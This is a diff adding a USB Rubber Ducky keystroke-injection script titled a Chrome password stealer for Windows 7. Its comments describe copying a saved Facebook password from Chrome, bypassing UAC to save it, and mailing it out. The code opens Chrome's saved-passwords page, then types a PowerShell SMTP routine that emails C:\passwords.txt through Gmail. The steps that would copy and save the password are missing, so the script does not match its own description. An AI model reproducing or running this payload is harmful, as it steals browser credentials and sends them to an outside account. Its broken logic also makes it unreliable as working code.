@@ -1,0 +1,48 @@
+REM Author: Nuk3leus
+REM Ducky chrome password stealer: 1.0
+REM Target: Windows 7
+REM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
+REM closes chrome, Opens notepad with bypass uac so it can save to C:\ drive and pastes in password 
+REM saves to C:\passwords.txt folder, closes notepad
+REM sends files via gmail to account.
+DELAY 2000
+REM -------------open chrome
+GUI r
+DELAY 1000
+STRING chrome
+DELAY 1000
+ENTER
+DELAY 4000
+REM -------------copy plaintext password
+STRING chrome://settings/passwords
+ALT F4
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'youremail@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('toemail@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Ducky chrome passwords'
+ENTER
+STRING $ReportEmail.Body = 'Attached is your list of passwords.' 
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\passwords.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
